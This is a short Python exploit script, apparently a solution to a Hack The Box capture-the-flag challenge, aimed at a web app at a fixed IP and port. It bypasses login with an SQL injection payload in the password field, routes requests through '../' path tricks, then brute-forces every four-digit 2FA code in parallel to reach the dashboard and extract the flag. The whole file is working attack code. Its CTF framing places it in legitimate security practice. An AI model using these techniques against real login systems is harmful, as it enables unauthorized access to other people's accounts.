#!/usr/bin/python

import requests
from multiprocessing import Pool
import tqdm
import re

HOST = "94.237.54.170:50984"
LOGIN_URL=f"http://{HOST}/../auth/login"
VERIFY_2FA_URL=f"http://{HOST}/../auth/verify-2fa"

# use prepared requests so we can ovewrite the URL so that ../ doesn't get stripped
r = requests.Request(method="POST", url=LOGIN_URL, data='username=a&password=a%27+or+1%3D1%3B+--+', headers={"Content-Type": "application/x-www-form-urlencoded"})
p = r.prepare()
p.url = LOGIN_URL
requests.Session().send(p, allow_redirects=True)

# 2fa shoud be enabled now

r = requests.Request(method="POST", url=VERIFY_2FA_URL, data="2fa-code=1234", headers={"Content-Type": "application/x-www-form-urlencoded"})
def test2FA(code):
  s = requests.Session()
  p = r.prepare()
  p.url = VERIFY_2FA_URL
  p.body = f'2fa-code={code}'
  res = s.send(p, allow_redirects=False)
  if res.is_redirect and 'dashboard' in res.headers['Location'] :
    # use the session to make this get request because we need the cookie that was set on the previous request
    dashboard = s.get(f"http://{HOST}{res.headers['Location']}").content
    return re.findall(r'HTB\{[^}]*\}', str(dashboard))[0]
  return None

flag = None
wordlist_2fa=[f'{x:04}' for x in range(10000)]
with Pool(processes=5) as pool:
  for k in pool.imap_unordered(test2FA, tqdm.tqdm(wordlist_2fa, total=len(wordlist_2fa))):
    if k:
      flag = k
      break
print(flag)
